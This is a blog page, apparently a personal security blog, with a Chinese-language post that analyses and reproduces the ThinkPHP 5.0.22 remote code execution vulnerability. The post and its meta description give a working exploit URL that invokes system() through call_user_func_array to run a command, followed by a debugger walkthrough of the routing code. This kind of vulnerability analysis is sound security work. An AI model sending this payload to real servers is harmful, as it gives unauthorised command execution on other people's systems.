@@ -1,0 +1,300 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>THINKPHP5.0.22远程代码执行漏洞分析及复现 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="前言THINKPHP5.0.22远程代码执行漏洞分析及复现 漏洞分析exp如下： 1&#x2F;public&#x2F;index.php?s&#x3D;index&#x2F;think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;whoami   使用debug来跟一下漏洞的触发过程 123456789&amp;lt">
+<meta property="og:type" content="article">
+<meta property="og:title" content="THINKPHP5.0.22远程代码执行漏洞分析及复现">
+<meta property="og:url" content="http://yoursite.com/2020/02/29/THINKPHP5-0-22%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="前言THINKPHP5.0.22远程代码执行漏洞分析及复现 漏洞分析exp如下： 1&#x2F;public&#x2F;index.php?s&#x3D;index&#x2F;think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;whoami   使用debug来跟一下漏洞的触发过程 123456789&amp;lt">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://yoursite.com/.com//17.png">
+<meta property="og:image" content="http://yoursite.com/.com//2.png">
+<meta property="og:image" content="http://yoursite.com/.com//3.png">
+<meta property="og:image" content="http://yoursite.com/.com//4.png">
+<meta property="og:image" content="http://yoursite.com/.com//5.png">
+<meta property="og:image" content="http://yoursite.com/.com//7.png">
+<meta property="og:image" content="http://yoursite.com/.com//6.png">
+<meta property="og:image" content="http://yoursite.com/.com//8.png">
+<meta property="og:image" content="http://yoursite.com/.com//9.png">
+<meta property="og:image" content="http://yoursite.com/.com//10.png">
+<meta property="og:image" content="http://yoursite.com/.com//11.png">
+<meta property="og:image" content="http://yoursite.com/.com//12.png">
+<meta property="og:image" content="http://yoursite.com/.com//13.png">
+<meta property="og:image" content="http://yoursite.com/.com//14.png">
+<meta property="og:image" content="http://yoursite.com/.com//15.png">
+<meta property="og:image" content="http://yoursite.com/.com//16.png">
+<meta property="og:image" content="http://yoursite.com/.com//17.png">
+<meta property="og:image" content="http://yoursite.com/.com//18.png">
+<meta property="og:image" content="http://yoursite.com/.com//19.png">
+<meta property="og:image" content="http://yoursite.com/.com//21.png">
+<meta property="og:image" content="http://yoursite.com/.com//22.png">
+<meta property="article:published_time" content="2020-02-29T13:48:45.000Z">
+<meta property="article:modified_time" content="2020-03-13T05:52:06.000Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/.com//17.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-THINKPHP5-0-22远程代码执行漏洞分析及复现" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/02/29/THINKPHP5-0-22%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%A4%8D%E7%8E%B0/" class="article-date">
+  <time datetime="2020-02-29T13:48:45.000Z" itemprop="datePublished">2020-02-29</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      THINKPHP5.0.22远程代码执行漏洞分析及复现
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>THINKPHP5.0.22远程代码执行漏洞分析及复现</p>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>exp如下：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/public/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</span><br></pre></td></tr></table></figure>
+
+<p><img src="/.com//17.png" alt="image-20200309202158419"></p>
+<p>使用debug来跟一下漏洞的触发过程</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ThinkPHP 引导文件</span></span><br><span class="line"><span class="comment">// 1. 加载基础文件</span></span><br><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span> . <span class="string">'/base.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 执行应用</span></span><br><span class="line">App::run()-&gt;send();</span><br></pre></td></tr></table></figure>
+
+
+
+<p>跟进run()，看到关键代码。</p>
+<p><img src="/.com//2.png" alt="image-20200310000602256"></p>
+<p>这里的<code>$dispatch</code>是空的，也就是未设置调度</p>
+<p><img src="/.com//3.png" alt="image-20200310001903943"></p>
+<p>跟进routeCheck()</p>
+<p><img src="/.com//4.png" alt="image-20200310002112545"></p>
+<p>其中<code>$path,$depr</code></p>
+<p><img src="/.com//5.png" alt="image-20200310002312139"></p>
+<p><img src="/.com//7.png" alt="image-20200310002842897"></p>
+<p>经过路由检测后,到这一行代码</p>
+<p><img src="/.com//6.png" alt="image-20200310002644385"></p>
+<p>跟进函数<code>parseUrl()</code></p>
+<p><img src="/.com//8.png" alt="image-20200310003123751"></p>
+<p>在这一行代码中,<code>$url</code>被分成存入<code>$path</code></p>
+<p><img src="/.com//9.png" alt="image-20200310003314054"></p>
+<p>解析模块，控制器，操作</p>
+<p><img src="/.com//10.png" alt="image-20200310003754654"></p>
+<p>然后封装路由</p>
+<p><img src="/.com//11.png" alt="image-20200310004003373"></p>
+<p><img src="/.com//12.png" alt="image-20200310004018935"></p>
+<p>回到<code>App.php</code></p>
+<p><img src="/.com//13.png" alt="image-20200310004135712"></p>
+<p>关键代码</p>
+<p><img src="/.com//14.png" alt="image-20200310004205934"></p>
+<p>跟进<code>exec()</code>这里跟进的是模块执行代码</p>
+<p><img src="/.com//15.png" alt="image-20200310004520405"></p>
+<p>在<code>module()</code>中</p>
+<p><img src="/.com//16.png" alt="image-20200310005005866"></p>
+<p><img src="/.com//17.png" alt="image-20200310005146448"></p>
+<p><img src="/.com//18.png" alt="image-20200310005237947"></p>
+<p>跟进<code>invokeMethod()</code></p>
+<p><img src="/.com//19.png" alt="image-20200310005605132"></p>
+<p><img src="/.com//21.png" alt="image-20200310005659885"></p>
+<p>到此调用<code>call_user_function()</code></p>
+<p><img src="/.com//22.png" alt="image-20200310005909300"></p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.cnblogs.com/st404/p/10245844.html" target="_blank" rel="noopener">THINKPHP5.0.22远程代码执行漏洞分析及复现</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2020/02/29/THINKPHP5-0-22%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%A4%8D%E7%8E%B0/" data-id="ck8sqr5iv000lkou562y90j8j" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2020/03/04/DC-2vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          DC-2vulnhub渗透测试
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2020/02/29/phpmyadmin4-8-1%E5%90%8E%E5%8F%B0getshell/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">phpmyadmin4.8.1后台getshell</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/someting/" rel="tag">someting</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/someting/" style="font-size: 10px;">someting</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 20px;">代码审计</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/01/">January 2019</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2020/04/09/MRCTF2020-web/">MRCTF2020-web</a>
+          </li>
+        
+          <li>
+            <a href="/2020/04/09/CVE-2020-1938/">CVE-2020-1938</a>
+          </li>
+        
+          <li>
+            <a href="/2020/04/09/CVE-2019-0232/">CVE-2019-0232</a>
+          </li>
+        
+          <li>
+            <a href="/2020/03/30/thinkphp5-1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">thinkphp5.1反序列化</a>
+          </li>
+        
+          <li>
+            <a href="/2020/03/20/BJDCTF-2nd/">BJDCTF-2nd</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2020 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
